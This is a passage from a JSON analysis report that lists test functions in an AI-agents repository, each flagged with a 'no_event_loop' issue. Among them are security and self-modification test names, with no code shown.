          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "network_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "failing_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "fallback_handler",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "primary_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "degraded_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "database_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "cache_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "api_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "database_fallback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "cache_fallback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "api_fallback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "write_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "read_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "slow_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "timeout_with_fallback",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "health_check_service",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
          "function": "monitor_system_health",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "start_monitoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "stop_monitoring",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "_monitor_loop",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "simulate_agent_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "simulate_database_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "simulate_api_request",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_concurrent_task_processing_small_load",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_concurrent_task_processing_high_load",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_sustained_load_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_concurrent_database_operations",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_database_connection_pool_exhaustion",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_api_endpoint_concurrent_requests",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_memory_usage_under_load",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_garbage_collection_impact",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "test_cascading_failure_recovery_time",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "controlled_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\performance\\test_concurrent_operations.py",
          "function": "pool_controlled_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "execute_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "improve_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "orchestrator",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_orchestrator_initialization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_agent_registration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_autonomous_task_decomposition",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_emergent_coordination_patterns",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_autonomous_performance_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_concurrent_autonomous_operations",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_safety_constraint_enforcement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_autonomy_level_transitions",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_capability_evolution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "coordination_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_swarm_intelligence_emergence",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_hierarchical_decision_making",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_consensus_mechanisms",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_conflict_resolution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_adaptive_coordination_patterns",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "emergence_detector",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_novel_behavior_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_behavior_cultivation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
          "function": "test_emergent_capability_integration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "causal_engine",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_basic_causal_discovery",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_complex_causal_network",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_confounding_variable_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_temporal_causal_relationships",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "intervention_engine",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_do_calculus_interventions",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_counterfactual_analysis",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_policy_intervention_simulation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_causal_effect_attribution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "integrated_reasoning",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_causal_reasoning_accuracy_target",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_causal_reasoning.py",
          "function": "test_real_time_causal_inference",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "execute_complex_business_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "_determine_task_success",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "_calculate_quality_score",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "integrated_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "business_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_95_percent_complex_task_success",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_end_to_end_business_workflow",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_adaptive_workflow_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "emergent_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_novel_capability_emergence",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_system_wide_capability_propagation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_cost_optimization_measurement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
          "function": "test_workflow_automation_completeness",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "execute_simple_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "execute_complex_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "orchestrator",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_1000_concurrent_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_sustained_load_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_memory_scalability",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_response_time_distribution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "working_memory",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_10k_token_capacity",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_memory_coherence_under_load",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "improvement_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_15_percent_improvement_target",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "_measure_system_performance",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "_apply_improvement_to_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_cpu_utilization_efficiency",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "test_memory_leak_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "read_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "write_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "search_operation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
          "function": "cpu_monitor",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "attempt_privilege_escalation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "attempt_data_exfiltration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "attempt_code_injection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "attempt_resource_exhaustion",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "security_framework",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "malicious_agent",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_security_framework_initialization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_malicious_behavior_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_automated_threat_response",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_security_policy_enforcement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_security_audit_logging",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "secure_self_modifying_agent",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_code_modification_security",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_sandboxed_code_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_modification_rollback_security",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_modification_approval_workflow",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "behavioral_monitor",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_normal_behavior_baseline",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_anomaly_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_adaptive_anomaly_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "threat_detector",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_signature_based_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_behavioral_threat_detection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_threat_intelligence_integration",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "emergency_response",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_emergency_detection_and_response",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_graduated_response_escalation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
          "function": "test_recovery_procedures",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "execute_benchmark_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "apply_performance_modification",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "self_modifying_agent",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_code_generation_capabilities",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_strategy_modification",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_capability_extension",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_learning_enhancement",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "evolution_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "evolving_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_15_percent_improvement_target",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_evolution_strategy_effectiveness",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_adaptive_evolution_parameters",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_multi_objective_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "safe_evolution_system",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_evolution_stability",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
          "function": "test_rollback_on_performance_degradation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_initial_state",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_state_transitions_during_processing",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_think_returns_valid_thought",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_act_returns_valid_action",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_observe_updates_metrics",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_full_processing_pipeline",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_stores_episodes",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_recall_similar",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_pattern_extraction",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_memory_persistence_with_backend",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_learning_system_updates",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_strategy_recommendation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_learning_convergence",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_execute_method_error_handling",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
          "function": "test_tool_execution_error_handling",
          "issue": "no_event_loop"
        },
        {
